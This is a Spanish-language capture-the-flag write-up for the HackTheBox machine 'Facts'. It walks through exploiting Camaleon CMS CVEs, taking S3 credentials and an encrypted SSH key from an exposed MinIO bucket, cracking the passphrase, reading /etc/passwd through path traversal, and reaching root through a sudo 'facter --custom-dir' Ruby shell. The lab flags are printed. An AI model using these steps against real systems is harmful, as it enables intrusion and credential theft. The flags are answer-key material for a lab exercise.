# Facts — HackTheBox

## Resumen

Máquina Linux en la que explotamos una **escalada de privilegios por asignación masiva (CVE-2025-2304)** en Camaleon CMS 2.9.0 para hacernos administradores del sitio. Desde el panel de administración obtenemos las **credenciales de un MinIO expuesto** en el puerto 54321, y un bucket que replica el sistema de archivos nos permite robar una **clave SSH cifrada**, cuya passphrase crackeamos con John the Ripper. Una **LFI autenticada (CVE-2024-46987)** nos sirve para enumerar los usuarios del sistema y saber a quién pertenece la clave. Ya dentro como `trivia`, escalamos a root abusando de `sudo` sobre el binario Ruby **`facter`** (`--custom-dir`).

**Flags:**
- user.txt: `b0e8dc502ac7befa1fbbdf4b0593801cd`
- root.txt: `f9242378c6b1e81b519012a247ca340e`

## 1. Reconocimiento

Comenzamos con un escaneo completo de puertos:

```bash
sudo nmap -p- -sS --min-rate=5000 -vvv -n -Pn 10.129.2.107 -oG allPorts
```

{/* ![Escaneo completo de puertos](./images/nmap_allports.png) */}

Los puertos abiertos son el **22 (SSH)**, el **80 (HTTP)** y el **54321 (desconocido)**. El escaneo de versiones revela:

```bash
sudo nmap -p22,80,54321 -sCV 10.129.2.107 -oN targeted
```

{/* ![Escaneo de versiones](./images/nmap_versions.png) */}

- **22/tcp** — OpenSSH 9.9p1 (Ubuntu)
- **80/tcp** — nginx 1.26.3, que redirige a `http://facts.htb/`
- **54321/tcp** — servidor HTTP en Golang que nmap identifica como **MinIO**, con el curioso mensaje de fingerprint `/nice ports,/Trinity.txt.bak`

Añadimos el dominio al `/etc/hosts`:

```bash
echo -n "10.129.2.107 facts.htb" | sudo tee -a /etc/hosts
```

{/* ![Añadiendo facts.htb a /etc/hosts](./images/etc_hosts.png) */}

## 4. CVE-2025-2304 — Escalada de privilegios por AJAX

Buscando vulnerabilidades del CMS en la versión que corre, encontramos el siguiente artículo y su PoC:

- [Mass Assignment Vulnerability in Camaleon CMS 2.9.0 - AJAX Privilege Escalation](https://medium.com/@iamkumarraj/mass-assignment-vulnerability-in-camaleon-cms-2-9-0-ajax-privilege-escalation-9a09c8253b52)
- [https://github.com/CsuriBird/CVE-2025-2304](https://github.com/CsuriBird/CVE-2025-2304)

La posibilidad de escalar privilegios por una vulnerabilidad de **AJAX** encaja con las rutas relacionadas con ajax que aparecían en gobuster. Clonamos el repositorio e instalamos dependencias:

{/* ![Clonando el exploit CVE-2025-2304](./images/clone_cve_2025_2304.png) */}

{/* ![Exploit ejecutado con éxito](./images/exploit_2025_2304.png) */}

## 6. MinIO: credenciales S3 en la configuración del sitio

Revisando **Settings → Filesystem Settings** encontramos la sección **"Save files in aws s3"** activada, con:
- **AWS Access Key / Secret Key**
- Bucket: `randomfacts`, región `us-east-1`
- **Endpoint: `http://localhost:54321`** ← el puerto 54321 que nmap identificó como **MinIO**

{/* ![Filesystem Settings con credenciales S3](./images/filesystem_settings.png) */}

Configuramos un perfil de **awscli** con esas credenciales apuntando al endpoint externo y listamos los buckets:

```bash
aws configure --profile facts2
aws --endpoint-url http://10.129.3.174:54321 s3 ls --profile facts2
```

{/* ![Configuración de awscli y listado de buckets](./images/aws_ls_buckets.png) */}

Hay dos buckets: `internal` y `randomfacts`. Listando `internal` de forma recursiva descubrimos que contiene una **copia casi completa del sistema de archivos** de la máquina (cachés de bundler, `.bashrc`, `.profile`... y, lo importante, `.ssh/authorized_keys` y `.ssh/id_ed25519`):

{/* ![Listado recursivo del bucket internal](./images/aws_recursive.png) */}

{/* ![Archivos .ssh en el bucket](./images/aws_ssh_listing.png) */}

Descargamos la clave pública y la privada:

{/* ![Descarga de authorized_keys](./images/aws_cp_authorized_keys.png) */}

{/* ![authorized_keys](./images/authorized_keys.png) */}

{/* ![Descarga de id_ed25519](./images/aws_cp_id_ed25519.png) */}

La clave privada está cifrada con passphrase, así que la convertimos con `ssh2john` y la crackeamos con **rockyou**:

```bash
ssh2john id_ed25519 > id_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_hash.txt
john --show id_hash.txt
```

{/* ![Passphrase crackeada: dragonballz](./images/john_crack.png) */}

Passphrase: **`dragonballz`**.

Intentamos conectar como root con la clave, pero no funciona (la clave no está autorizada para root):

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 root@10.129.3.174
# Permission denied
```

{/* ![Acceso root denegado](./images/ssh_root_denied.png) */}

Pregunta clave: **¿a qué usuario pertenece esta clave?** Exploramos más archivos del bucket (`.bashrc`, versiones de gems de Ruby...) sin encontrar la respuesta:

{/* ![Leyendo .bashrc del bucket](./images/aws_bashrc.png) */}

{/* ![Versiones de gems](./images/aws_gems.png) */}

## 7. CVE-2024-46987 — Path Traversal autenticado

Retomamos la máquina (la instancia se había reiniciado, con nueva IP) y probamos de nuevo el script de ejecución de comandos para Camaleon CMS (CVE-2024-46986, pensado para otra versión, pero por si acaso). No funciona:

{/* ![Reintento de CVE-2024-46986](./images/cve_2024_46986.png) */}

Buscando más a fondo (y admito que mirando un poco la solución, ya que lo que habíamos probado antes era lo primero que salía, el CVE-2024-46986), encontramos el **CVE-2024-46987**: un **Path Traversal** autenticado en Camaleon CMS 2.8.0 < 2.8.2 que **también funciona en 2.9.0**, permitiendo leer archivos arbitrarios del servidor:

{/* ![Clonando CVE-2024-46987](./images/clone_cve_2024_46987.png) */}

{/* ![Descripción del CVE-2024-46987](./images/github_cve_2024_46987.png) */}

Lo usamos para leer `/etc/passwd` y descubrir los usuarios del sistema:

```bash
python CVE-2024-46987.py -u http://facts.htb -l test -p test /etc/passwd
```

{/* ![/etc/passwd leído](./images/etc_passwd.png) */}

Los usuarios con shell son **`trivia`** (uid 1000) y **`william`** (uid 1001).

## 8. Acceso inicial por SSH

Repetimos la descarga de la clave desde el bucket `internal` (la máquina se reinició, pero el bucket sigue ahí) y probamos con el primer usuario:

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 . --profile facts
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@10.129.13.13
# passphrase: dragonballz
```

¡Conseguimos sesión SSH como **trivia**!

{/* ![Sesión SSH como trivia](./images/ssh_trivia.png) */}

## 10. Escalada de privilegios: sudo facter → root

Lo primero es lo de siempre: `sudo -l` y binarios SUID. Vemos que podemos ejecutar **`facter`** como root sin contraseña:

{/* ![sudo -l](./images/sudo_l.png) */}

Vemos que `facter` es un binario escrito en **Ruby**:

{/* ![facter es un script Ruby](./images/facter_ruby.png) */}

Al buscar información sobre este binario en **GTFOBins**, se observa que `facter` permite el uso del parámetro **`--custom-dir`**. Este parámetro hace que el programa cargue "custom facts", es decir, **scripts Ruby desde un directorio que le indiquemos**. Lo importante es que `facter` ejecuta el primer archivo `.rb` que encuentra en ese directorio.

La idea es directa: si controlamos el directorio, introducimos nuestro propio script malicioso en Ruby y, como `facter` se ejecuta con `sudo`, el script correrá como **root**:

```bash
cd /tmp
echo 'exec "/bin/sh"' > shell.rb
sudo facter --custom-dir /tmp
```

{/* ![Shell como root](./images/root.png) */}

Ya somos root, y leemos la flag:

`f9242378c6b1e81b519012a247ca340e`
